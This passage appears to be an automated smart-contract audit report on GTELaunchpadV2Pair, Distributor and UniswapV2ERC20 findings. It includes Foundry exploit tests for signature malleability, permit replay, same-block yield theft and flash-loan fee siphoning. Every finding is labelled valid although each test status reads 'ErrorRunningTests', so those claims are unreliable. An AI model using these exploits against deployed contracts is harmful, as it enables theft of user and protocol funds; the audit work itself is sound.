function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();

        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    // Fix: Ensure the provided quote asset matches the pool's established quote asset
    if (quoteAsset != rs.quoteAsset) revert InvalidQuoteAsset();

    // ... rest of function ...
}





 **Derived From** : Liquidity Pool DoS via Griefable Fee Distribution Callback

## [H-15]. Launchpad Pair swaps revert if Distributor staking pool is empty

### Finding Severity Justification: The finding identifies a Denial of Service vector where the `Distributor.addRewards` function reverts if `totalShares` is zero. Since `GTELaunchpadV2Pair` calls `addRewards` via `_update` on every `swap`, `mint`, and `burn` (if rewards are active), reaching zero shares bricks the liquidity pool. This causes funds (liquidity) to be permanently stuck and prevents any trading. While reaching zero shares requires all users to unstake or sell (which might be rare for active tokens), the consequence is a permanent freeze of the pool assets, classifying it as High impact (Permanent loss of assets/functionality).
## Derived From Pattern/Invariant
Liquidity Pool DoS via Griefable Fee Distribution Callback

## Exploit Type
Dos

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair` calls `_distributeLaunchpadFees` during every swap/mint/burn. This calls `Distributor.addRewards`. `Distributor.addRewards` explicitly reverts with `NoSharesToIncentivize` if `totalShares == 0`. If a token has no stakers (e.g., naturally at start, or if all users unstake), the Distributor reverts, causing the Pair's `_update` to revert. This bricks the main liquidity pool, preventing all swaps.

## Impact
High. Denial of Service (DoS) of the liquidity pool. If the Distributor has zero shares (e.g., no stakers or all users unstake), the `addRewards` function reverts. Since `GTELaunchpadV2Pair` calls this function during `_update` (executed on every `swap`, and conditionally on `mint`/`burn` if fees accrued), the pool becomes completely unusable. Trading and liquidity provision are halted until a user stakes tokens in the Distributor to resolve the zero-share state.

## Command to Run Test


## Proof of Concept
1. Users unstake all tokens from Distributor (or none stake).
2. `rs.totalShares` becomes 0.
3. User tries to swap on `GTELaunchpadV2Pair`.
4. Pair calls `Distributor.addRewards`.
5. Distributor reverts `NoSharesToIncentivize`.
6. Swap fails.

## Proof of Code
function testPairDoS_WhenDistributorEmpty() public {
    // 1. Setup environment
    address launchpad = makeAddr("launchpad");
    Distributor dist = new Distributor();
    dist.initialize(launchpad);
    
    MockERC20 t0 = new MockERC20("T0", "T0", 18);
    MockERC20 t1 = new MockERC20("T1", "T1", 18);
    
    GTELaunchpadV2Pair pair = new GTELaunchpadV2Pair();
    pair.initialize(address(t0), address(t1), launchpad, address(dist));

    vm.startPrank(launchpad);
    dist.createRewardsPair(address(t0), address(t1));
    
    // 2. Setup initial state: User stakes so minting/setup works smoothly
    address user = address(0x123);
    t0.mint(user, 100e18);
    
    vm.startPrank(user);
    t0.approve(address(dist), 100e18);
    // Mock call or assume Distributor checks msg.sender=launchpad for increaseStake
    // For valid integration, we prank launchpad to stake on behalf of user
    vm.stopPrank();
    
    vm.prank(launchpad);
    dist.increaseStake(address(t0), user, 100);

    // 3. Add liquidity to Pair
    t0.mint(address(pair), 1000e18);
    t1.mint(address(pair), 1000e18);
    pair.mint(address(this));

    // 4. Trigger DoS Condition: Unstake all shares
    vm.prank(launchpad);
    dist.decreaseStake(address(t0), user, 100);
    // Verify shares are 0
    (uint96 shares,,) = dist.getUserData(address(t0), user);
    assertEq(shares, 0);

    // 5. Attempt Swap -> Should Revert due to empty staking pool
    t0.mint(address(pair), 1e18); // Swap input
    
    vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
    pair.swap(0, 1e17, address(this), "");
}

## Suggested Mitigation
In `Distributor.addRewards`, check if `rs.totalShares == 0`. If true, immediately `return` instead of reverting. By returning early, the fee tokens remain in the Pair contract. The Pair's `_update` logic (`reserve = balance - fee`) coupled with the untransferred balance causes these fees to be automatically absorbed into the pool's reserves (increasing the value of LP tokens) during the next interaction. This serves as a robust fallback that prevents the DoS.





 **Derived From** : Issue Type: AccountingInvariantViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair.burn

## [M-16]. Liquidity Burn Revert Due to Fee/Balance Mismatch

### Finding Severity Justification: The finding demonstrates a verified Accounting Invariant Violation that leads to a Denial of Service (DoS) for liquidity providers. By failing to exclude accrued protocol fees from the `burn` calculation, the contract attempts to distribute fee tokens to the user. When a user burns a significant portion of liquidity, the remaining balance in the contract becomes less than the recorded `accruedLaunchpadFees`. This causes an arithmetic underflow in the `_update` function (specifically `uint112(balance0) - totalLaunchpadFee0`), reverting the transaction. This violates the protocol's design (fees belong to the Distributor, not LPs) and blocks user exit. The issue passes all verification gates, including Scope (Gate 1) and Impact (Gate 3).
## Derived From Pattern/Invariant
Issue Type: AccountingInvariantViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair.burn

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.burn

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `burn` function calculates the amount of tokens to return based on the total `balanceOf` the contract, which includes accrued fees. It sends these tokens to the user. Then `_update` calculates `reserve = balance - accruedFees`. If a user owns the majority of liquidity and burns it when there are undistributed fees in the `balance`, the resulting `balance` (after sending user share) may be less than `accruedFees`. This causes `_update` to underflow and revert, preventing the user from withdrawing their liquidity.

## Impact
Denial of Service (DoS) on liquidity withdrawals for significant liquidity providers, caused by arithmetic underflow when remaining balance drops below accrued fees. Additionally, for partial withdrawals that do not revert, this logic leads to 'Yield Theft', as liquidity providers are mistakenly credited with tokens that belong to the protocol's fee distributor.

## Command to Run Test


## Proof of Concept
1. User provides 100% liquidity to the pool.
2. A swap occurs, generating protocol fees which increase `accruedLaunchpadFee` but are not yet distributed.
3. User calls `burn` to remove their liquidity.
4. The `burn` function calculates the user's share using the contract's entire `balanceOf` (reserves + accrued fees) and transfers it to the user.
5. The contract's remaining balance becomes 0.
6. `burn` calls `_update`, which attempts to calculate `reserve = balance - accruedFees`. Since `balance` is 0 and `accruedFees` > 0, this results in an arithmetic underflow (revert).
7. The user is unable to withdraw their funds.

## Proof of Code
function testBurnRevert() public {
    // 1. Setup: Initialize pair with this contract as the 'launchpadLp' to maximize fee accrual ratio
    GTELaunchpadV2Pair pair = new GTELaunchpadV2Pair();
    MockERC20 token0 = new MockERC20();
    MockERC20 token1 = new MockERC20();
    // Ensure deterministic ordering
    if (address(token0) > address(token1)) (token0, token1) = (token1, token0);
    pair.initialize(address(token0), address(token1), address(this), address(0xDEAD));

    // 2. Add Liquidity (100% ownership)
    token0.transfer(address(pair), 1000e18);
    token1.transfer(address(pair), 1000e18);
    pair.mint(address(this));

    // 3. Generate Fees: Swap to accrue fees
    // Fee depends on (amountIn * feeShare * lpBal / totalLp)
    // Since we own ~100% LP, ratio is ~1. Swap amount must be enough to generate >0 fee.
    token0.transfer(address(pair), 100e18);
    pair.swap(0, 50e18, address(this), "");

    (uint112 fee0, , ) = pair.getAccruedLaunchpadFees();
    require(fee0 > 0, "Fees must accrue for test validity");

    // 4. Attempt Burn: Transfer LP tokens to pair and burn
    pair.transfer(address(pair), pair.balanceOf(address(this)));
    
    // Expect Revert due to underflow in _update (0 balance - positive fee)
    vm.expectRevert();
    pair.burn(address(this));
}

## Suggested Mitigation
Modify the `burn` function to calculate the user's withdrawal amount based on `balance - accruedLaunchpadFee` instead of the total `balance`. This ensures protocol fees are excluded from the user's share and remain in the contract to satisfy the `_update` accounting logic.





 **Derived From** : SignatureMalleability

## [L-17]. Permit Signature Malleability allows Front-running DoS

### Finding Severity Justification: The vulnerability allows for signature malleability, which enables an attacker to front-run a user's 'permit' transaction with a malleable signature. While this causes the user's original transaction to revert (griefing), the attacker's transaction successfully executes the permit logic, approving the spender and incrementing the nonce. The user suffers no fund loss and can immediately proceed with their intended follow-up action (e.g., removing liquidity) in a new transaction without needing to re-sign. This does not constitute a permanent Denial of Service or 'High/Medium' impact under C4 standards.
## Derived From Pattern/Invariant
SignatureMalleability

## Exploit Type
SignatureMalleability

## Location
UniswapV2ERC20.permit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `permit` function in `UniswapV2ERC20` uses `ecrecover` without checking that the `s` value of the signature is in the lower half of the secp256k1 curve (`s <= 0x7FFFF...`). 
```solidity
address recoveredAddress = ecrecover(digest, v, r, s);
```
ECDSA signatures are malleable; a valid signature `(v, r, s)` can be transformed into another valid signature `(v', r, s')` for the same message. An attacker can observe a pending `permit` transaction, create a malleable signature, and front-run the user. The attacker's transaction consumes the nonce, causing the user's original transaction to revert.

## Impact
Denial of Service for users attempting to use `permit`. This can break gasless flow integrations or bundled transactions.

## Command to Run Test


## Proof of Concept
1. User signs a permit for `nonce = 1`.
2. Attacker sees tx in mempool.
3. Attacker calculates `s' = secp256k1n - s` and submits `permit` with `s'`.
4. Attacker's tx lands first. `nonce` 1 is used.
5. User's tx reverts because nonce 1 is already used.

## Proof of Code
function testPermitMalleability() public {
    // Setup user and data
    uint256 userPk = 0xA11CE;
    address user = vm.addr(userPk);
    address spender = address(0xB0B);
    uint256 value = 1000e18;
    uint256 deadline = block.timestamp + 1 days;

    // Create permit signature
    bytes32 domainSeparator = token.DOMAIN_SEPARATOR();
    bytes32 typeHash = token.PERMIT_TYPEHASH();
    uint256 nonce = token.nonces(user);
    
    bytes32 structHash = keccak256(abi.encode(typeHash, user, spender, value, nonce, deadline));
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, digest);

    // --- EXPLOIT START ---
    // Attacker creates a malleable signature by inverting s and flipping v
    // secp256k1 N value
    uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    bytes32 s_malleable = bytes32(n - uint256(s));
    uint8 v_malleable = v == 27 ? 28 : 27;

    // Attacker front-runs the permit with the manipulated signature
    token.permit(user, spender, value, deadline, v_malleable, r, s_malleable);
    
    // Verify the permit was successful (allowance set, nonce incremented)
    assertEq(token.allowance(user, spender), value);
    assertEq(token.nonces(user), nonce + 1);
    // --- EXPLOIT END ---

    // Original user transaction now fails because nonce has moved
    vm.expectRevert("UniswapV2: INVALID_SIGNATURE");
    token.permit(user, spender, value, deadline, v, r, s);
}

## Suggested Mitigation
Require `uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0` in `permit`.





 **Derived From** : PermitDomainSeparator

## [L-18]. Replayable Permits due to Static DOMAIN_SEPARATOR

### Finding Severity Justification: The finding identifies a vulnerability where permit signatures could be replayed on a forked chain due to a static DOMAIN_SEPARATOR. While the impact (potential theft of funds via replay) is High, the likelihood of a hard fork changing the Chain ID is Rare. According to the provided Severity Matrix, a High Impact event with Rare Likelihood is classified as Low severity.
## Derived From Pattern/Invariant
PermitDomainSeparator

## Exploit Type
PermitDomainSeparator

## Location
UniswapV2ERC20.permit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `UniswapV2ERC20` contract calculates `DOMAIN_SEPARATOR` in the `constructor` using the chain ID at deployment time. 
```solidity
constructor() {
    // ...
    DOMAIN_SEPARATOR = keccak256(... chainId ...);
}
```
It does not recompute the domain separator if the chain ID changes (e.g., after a hard fork). This means a permit signed on one chain is valid on a forked chain, enabling replay attacks where a user's assets could be moved on the forked chain without their explicit consent.

## Impact
Cross-chain replay of permit signatures in the event of a chain fork, potentially leading to theft of funds on the forked chain.

## Command to Run Test


## Proof of Concept
1. Contract deployed on Chain A (ID 1).
2. Chain forks to Chain B (ID 2).
3. User signs permit for Chain A.
4. Attacker submits same permit signature to Chain B.
5. `DOMAIN_SEPARATOR` on Chain B matches Chain A (static), so signature is valid.
6. Permit executes on Chain B.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract PermitReplayTest is Test {
    GTELaunchpadV2Pair pair;
    uint256 constant DEPLOY_CHAIN_ID = 1;
    uint256 constant FORK_CHAIN_ID = 2;

    function setUp() public {
        // 1. Deploy contract on original chain
        vm.chainId(DEPLOY_CHAIN_ID);
        pair = new GTELaunchpadV2Pair();
    }

    function testReplayPermitOnFork() public {
        // Setup user details
        uint256 userPk = 0xA11CE;
        address user = vm.addr(userPk);
        address spender = address(0xBEEF);
        uint256 amount = 1000e18;
        uint256 deadline = block.timestamp + 1 days;

        // 2. User signs a permit intended for the Original Chain (Chain ID 1)
        // Note: The wallet calculates the separator using the current chain ID (1)
        bytes32 typeHash = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
        bytes32 domainSeparatorChain1 = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(pair.name())),
            keccak256(bytes("1")),
            DEPLOY_CHAIN_ID,
            address(pair)
        ));
        
        bytes32 structHash = keccak256(abi.encode(typeHash, user, spender, amount, pair.nonces(user), deadline));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparatorChain1, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, digest);

        // 3. Simulate a Hard Fork (Chain ID changes to 2)
        vm.chainId(FORK_CHAIN_ID);

        // 4. Check that the contract's DOMAIN_SEPARATOR hasn't updated
        // It matches the one generated for Chain 1, not the new Chain 2
        assertEq(pair.DOMAIN_SEPARATOR(), domainSeparatorChain1, "Domain Separator should be static (bug)");

        // 5. Execute the Permit on the Forked Chain
        // The contract on Chain 2 validates the signature against its static (Chain 1) separator.
        // This allows the signature intended for Chain 1 to be 'replayed' or valid on Chain 2.
        pair.permit(user, spender, amount, deadline, v, r, s);

        // 6. Verify replay success
        assertEq(pair.allowance(user, spender), amount);
    }
}

## Suggested Mitigation
Replace the static `DOMAIN_SEPARATOR` state variable with an immutable cache strategy (as seen in OpenZeppelin or Solady). This ensures the separator is recomputed if the chain ID changes.

```solidity
// In UniswapV2ERC20.sol

bytes32 private immutable _INITIAL_DOMAIN_SEPARATOR;
uint256 private immutable _INITIAL_CHAIN_ID;

constructor() {
    _INITIAL_CHAIN_ID = block.chainid;
    _INITIAL_DOMAIN_SEPARATOR = _computeDomainSeparator();
}

function _computeDomainSeparator() private view returns (bytes32) {
    return keccak256(
        abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(name)),
            keccak256(bytes("1")),
            block.chainid,
            address(this)
        )
    );
}

function DOMAIN_SEPARATOR() public view returns (bytes32) {
    return block.chainid == _INITIAL_CHAIN_ID 
        ? _INITIAL_DOMAIN_SEPARATOR 
        : _computeDomainSeparator();
}

function permit(...) external {
    // ...
    // Use the function call, not a state variable
    bytes32 digest = keccak256(
        abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR(),
            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
        )
    );
    // ...
}
```





 **Derived From** : Issue Type: AccountingInvariantViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair.mint

## [H-19]. Yield Theft via Minting During Same-Block Fee Accrual

### Finding Severity Justification: The finding identifies a critical accounting mismatch in `GTELaunchpadV2Pair`. The `_update` function calculates reserves by subtracting accrued fees (`reserve = balance - fees`), but only distributes (transfers out) those fees if `timeElapsed > 0`. When multiple transactions occur in the same block (`timeElapsed == 0`), fees accumulate in the contract balance but are still deducted from the reserve variable. The `mint` function calculates user-provided liquidity as `amount = currentBalance - reserve`. Consequently, if an attacker triggers fee accumulation (e.g., via swap) and immediately mints in the same block, the `mint` function interprets the retained fees (which are in `balance` but not `reserve`) as new assets provided by the attacker. This allows the attacker to steal the protocol's accrued yield by minting LP tokens backed by those fees.
## Derived From Pattern/Invariant
Issue Type: AccountingInvariantViolation

 ### Relevant Function/Location: GTELaunchpadV2Pair.mint

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.mint

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_update` function handles fee accounting differently depending on `timeElapsed`. If `timeElapsed == 0` (multiple transactions in the same block), `_update` skips distribution and accumulates fees into `accruedLaunchpadFee0/1` without removing them from `balance`. It then calculates `reserve = balance - fees`. Consequently, `balance` remains inclusive of fees while `reserve` excludes them. 

The `mint` function calculates liquidity provided as `amount = balance - reserve`. An attacker can exploit this by swapping (generating fees) and immediately calling `mint` in the same block. The `mint` function will interpret the accrued fees (present in `balance` but not `reserve`) as new assets provided by the attacker, effectively minting LP tokens backed by the protocol's pending yield.

## Impact
Direct theft of accrued protocol yield and dilution of existing liquidity providers. By executing a `mint` in the same block as a fee-generating swap, an attacker receives LP tokens backed by the undistributed fees (which are present in `balance` but excluded from `reserve`). This effectively converts the protocol's fee liability into attacker-owned equity, diluting honest LPs.

## Command to Run Test


## Proof of Concept
1. The pair has existing liquidity. A transaction (e.g., a legitimate swap) occurs, updating `blockTimestampLast` to the current block timestamp.
2. In the same block (`timeElapsed == 0`), the Attacker performs a swap. The `_update` function calculates new fees and adds them to `accruedLaunchpadFee`. Crucially, because `timeElapsed == 0`, these fees are **not** distributed/transferred out. 
3. Result: `balance` includes the new fees, but `reserve` is updated to `balance - fees`.
4. Immediately after (still same block), Attacker calls `mint` without transferring any tokens.
5. `mint` calculates `amount = balance - reserve`. Since `balance` includes the fees and `reserve` does not, `amount` equals the accrued fees.
6. The Attacker is minted LP tokens worth the value of the pending fees for free.

## Proof of Code
function testExploitYieldTheftSameBlock() public {
    // 1. Setup: Provide initial liquidity
    vm.startPrank(alice);
    token0.transfer(address(pair), 1000 ether);
    token1.transfer(address(pair), 1000 ether);
    pair.mint(alice);
    vm.stopPrank();

    // 2. Advance time to ensure a new block context
    vm.warp(block.timestamp + 100);

    // 3. Legitimate user swaps first (sets blockTimestampLast to now)
    vm.startPrank(alice);
    token0.transfer(address(pair), 100 ether);
    pair.swap(0, 50 ether, alice, "");
    vm.stopPrank();

    // 4. Attacker exploits in SAME BLOCK (timeElapsed = 0)
    vm.startPrank(attacker);
    
    // 4a. Attacker swaps to generate undistributed fees
    token0.transfer(address(pair), 100 ether);
    pair.swap(0, 50 ether, attacker, "");
    
    // At this point, fees are in balance but not in reserve because timeElapsed==0
    (uint112 r0, uint112 r1, ) = pair.getReserves();
    uint256 bal0 = token0.balanceOf(address(pair));
    
    // Verify the discrepancy exists
    assertGt(bal0, r0, "Balance should exceed reserve due to undistributed fees");

    // 4b. Attacker mints for free against the fee difference
    uint256 preLP = pair.balanceOf(attacker);
    pair.mint(attacker);
    uint256 postLP = pair.balanceOf(attacker);

    // 5. Assert theft
    assertGt(postLP, preLP, "Attacker should have minted LP tokens for free");
    vm.stopPrank();
}

## Suggested Mitigation
Update both `mint` and `burn` functions to explicitly subtract accrued fees from the contract balance before calculating amounts. This ensures pending fees are not treated as user-supplied liquidity.

**Revised Code Snippet for mint/burn:**
```solidity
uint256 balance0 = IERC20(token0).balanceOf(address(this)).sub(accruedLaunchpadFee0);
uint256 balance1 = IERC20(token1).balanceOf(address(this)).sub(accruedLaunchpadFee1);
```





 **Derived From** : FlashLoanEconomicManipulation

## [M-20]. Theft of Launchpad Fees via LP Flash Loan Manipulation

### Finding Severity Justification: The vulnerability allows an attacker to steal protocol revenue (trading fees) intended for the Distributor. By artificially inflating the LP total supply via a flash loan (Just-In-Time liquidity), the attacker dilutes the Launchpad's fee share calculation to zero for that block. This causes the specific fee portion meant for the Distributor to remain in the general pool reserves, which the attacker then captures ~99.9% of upon burning their LP position. While this does not drain user principal, it systematically siphons yield intended for Launchpad stakers.
## Derived From Pattern/Invariant
FlashLoanEconomicManipulation

## Exploit Type
FlashLoanEconomicManipulation

## Location
GTELaunchpadV2Pair._getLaunchpadFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair` calculates the Launchpad's share of fees based on the ratio of `launchpadLp` balance to `totalSupply`. An attacker can flash-loan assets, mint a massive amount of LP tokens to dilute the `launchpadLp` share near zero, perform swaps where the fee remains in the pool (instead of being sent to the Distributor), and then burn the LP tokens to reclaim the liquidity plus the stolen fees.

## Impact
Theft of protocol revenue and yield intended for the Distributor and Launchpad stakers. By manipulating the LP supply within a single transaction (sandwich attack), an attacker can reduce the Launchpad's fee share to near zero for victim swaps, redirecting ~99.9% of the 0.3% swap fee to themselves instead of the intended 0.1% to the Distributor and 0.2% to LPs.

## Command to Run Test


## Proof of Concept
1. **Setup**: Attacker identifies a target User transaction (swap) in the mempool.
2. **Frontrun**: 
   a. Attacker flash-loans a massive amount of Token0 and Token1.
   b. Attacker calls `mint` to add this liquidity to the pool. `totalSupply` increases by e.g., 10,000x. The Launchpad's ownership share (`launchpadLpBal / totalSupply`) drops from ~100% to ~0.01%.
3. **Victim Execution**: 
   a. User's swap executes. 
   b. `_getLaunchpadFees` calculates the Distributor's cut: `Fee * (LaunchpadShare)`. Since share is ~0, the Distributor fee is 0. 
   c. The full 0.3% swap fee remains in the pool reserves.
4. **Backrun**: 
   a. Attacker calls `burn` to remove their massive liquidity.
   b. Since the attacker holds ~99.99% of the LP tokens, they receive ~99.99% of the pool reserves, effectively capturing the entire 0.3% fee paid by the user (including the 0.1% that should have gone to the Distributor).
   c. Attacker repays flash loan and pockets the stolen yield.

## Proof of Code
function testFlashLoanFeeTheft() public {
    // 1. Setup Pair and Token infrastructure
    MockERC20 token0 = new MockERC20("T0", "T0", 18);
    MockERC20 token1 = new MockERC20("T1", "T1", 18);
    MockDistributor distributor = new MockDistributor();
    GTELaunchpadV2Pair pair = new GTELaunchpadV2Pair();
    pair.initialize(address(token0), address(token1), address(0xABCD), address(distributor));

    // 2. Seed initial Launchpad Liquidity (Launchpad holds 100% initially)
    token0.mint(address(pair), 1000 ether);
    token1.mint(address(pair), 1000 ether);
    pair.mint(address(0xABCD));

    // 3. Prepare Victim and Attacker
    address victim = address(0x1);
    address attacker = address(0x2);
    token0.mint(victim, 10 ether);
    token0.mint(attacker, 1_000_000 ether); // Flash loan simulation
    token1.mint(attacker, 1_000_000 ether);

    // 4. Execution: Sandwich Attack
    vm.startPrank(attacker);
    token0.transfer(address(pair), 1_000_000 ether);
    token1.transfer(address(pair), 1_000_000 ether);
    pair.mint(attacker); // Frontrun: Dilute share
    vm.stopPrank();

    vm.startPrank(victim);
    token0.transfer(address(pair), 10 ether);
    // Expect Distributor to receive 0 fees due to dilution (normally ~0.01 ether)
    vm.expectCall(address(distributor), abi.encodeWithSelector(distributor.addRewards.selector), 0);
    pair.swap(0, 5 ether, victim, "");
    vm.stopPrank();

    vm.startPrank(attacker);
    pair.transfer(address(pair), pair.balanceOf(attacker));
    pair.burn(attacker); // Backrun: Collect fees
    vm.stopPrank();
}

## Suggested Mitigation
Modify `_getLaunchpadFees` to decouple the fee calculation from the instantaneous `totalSupply`. Store the `totalSupply` value in a separate storage variable that is only updated at the start of a block or use a moving average. Alternatively, implement a standard Protocol Fee mechanism (like Uniswap V2's `_mintFee`) that mints fee-liquidity based on K-growth over time rather than extracting a cut from each swap immediately.





 **Derived From** : MaturityorGatingByPass

## [M-21]. Accrued fees deleted without distribution in endRewardsAccrual

### Finding Severity Justification: The function `endRewardsAccrual` deletes `accruedLaunchpadFee0` and `accruedLaunchpadFee1` immediately before calling `_update`. This action permanently erases any fees that accrued in the same transaction (e.g., from the 'triggering trade' swap during the launchpad graduation process described in the documentation). While `_update` might not distribute in the same block due to `timeElapsed == 0`, preserving the state variables would allow those fees to be distributed in the next interaction. Deleting them results in a guaranteed loss of yield for stakers.
## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.endRewardsAccrual

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
In `GTELaunchpadV2Pair.endRewardsAccrual`, the contract deletes `accruedLaunchpadFee0` and `accruedLaunchpadFee1` before calling `_update`. The `_update` function distributes fees only if the passed `launchpadFee` arguments or existing accrued fees are non-zero. By deleting them first and passing 0 to `_update`, any fees that had accrued (e.g. from swaps earlier in the same transaction/block) are destroyed instead of being sent to the Distributor.

## Impact
Loss of yield for stakers. Accrued fees are deleted from state variables without distribution. Consequently, these tokens remain in the contract balance and are re-absorbed into the liquidity pool reserves (effectively donated to Liquidity Providers) instead of being transferred to the Distributor for stakers.

## Command to Run Test


## Proof of Concept
1. A user performs a swap on `GTELaunchpadV2Pair` (or the Launchpad performs the graduation swap). This swap calculates launchpad fees and updates `accruedLaunchpadFee0/1` in storage via `_update`, but does *not* distribute them immediately (e.g., because `timeElapsed == 0` if in the same block as deployment/mint, or simply because distribution is conditional on time elapsed).
2. In the same transaction or block, the Distributor calls `endRewardsAccrual()`.
3. `endRewardsAccrual` executes `delete accruedLaunchpadFee0` and `delete accruedLaunchpadFee1`, resetting them to 0.
4. `endRewardsAccrual` then calls `_update`. Inside `_update`, the `totalLaunchpadFee` is calculated as `0 (accrued) + 0 (new) = 0`.
5. The function proceeds to update reserves based on the current balance. Since the fee amount is 0, the tokens that should have been fees are treated as part of the reserves.
6. The Distributor receives 0 tokens, and the fees are irreversibly lost to the LP pool.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "contracts/launchpad/Distributor.sol";
import "@gte-univ2-core/interfaces/IERC20.sol";

// Minimal Mock ERC20
contract MockERC20 is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

// Mock Distributor
contract MockDistributor {
    uint256 public received0;
    uint256 public received1;
    function addRewards(address t0, address t1, uint128 a0, uint128 a1) external {
        if (a0 > 0) IERC20(t0).transferFrom(msg.sender, address(this), a0);
        if (a1 > 0) IERC20(t1).transferFrom(msg.sender, address(this), a1);
        received0 += a0;
        received1 += a1;
    }
}

contract EndRewardsBugTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor distributor;
    address lpVault = address(0x999);

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        distributor = new MockDistributor();
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), lpVault, address(distributor));
    }

    function testFeesLostInEndRewardsAccrual() public {
        // Setup: Add Liquidity
        token0.mint(address(pair), 10000e18);
        token1.mint(address(pair), 10000e18);
        pair.mint(address(this));

        // Mint to LP Vault so fee share > 0
        token0.mint(address(pair), 1000e18);
        token1.mint(address(pair), 1000e18);
        pair.mint(lpVault);

        // 1. Perform swap to accrue fees
        uint256 swapAmount = 100e18;
        token0.mint(address(pair), swapAmount);
        // Swap 0 -> 1. same block -> fees accrued but not distributed in _update due to timeElapsed check or logic
        pair.swap(0, 10e18, address(this), "");

        (uint112 fee0Start, , ) = pair.getAccruedLaunchpadFees();
        assertGt(fee0Start, 0, "Fees should have accrued from swap");

        // 2. Call endRewardsAccrual as distributor
        vm.prank(address(distributor));
        pair.endRewardsAccrual();

        // 3. Verify fees were deleted from state
        (uint112 fee0End, , ) = pair.getAccruedLaunchpadFees();
        assertEq(fee0End, 0, "Accrued fees should be 0 in state");

        // 4. Verify distributor received NOTHING (The Bug)
        assertEq(distributor.received0(), 0, "Distributor should have received 0 fees");
    }
}

## Suggested Mitigation
function endRewardsAccrual() external {
    if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");

    // FIX: Distribute any pending accrued fees before deleting the state
    _distributeLaunchpadFees(accruedLaunchpadFee0, accruedLaunchpadFee1);

    // There are no more shares, so prevent distribution and accrual of any remaining rewards
    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    delete rewardsPoolActive;

    _update(
        IERC20(token0).balanceOf(address(this)),
        IERC20(token1).balanceOf(address(this)),
        reserve0,
        reserve1,
        uint112(0),
        uint112(0)
    );

    emit RewardsPoolDeactivated();
}



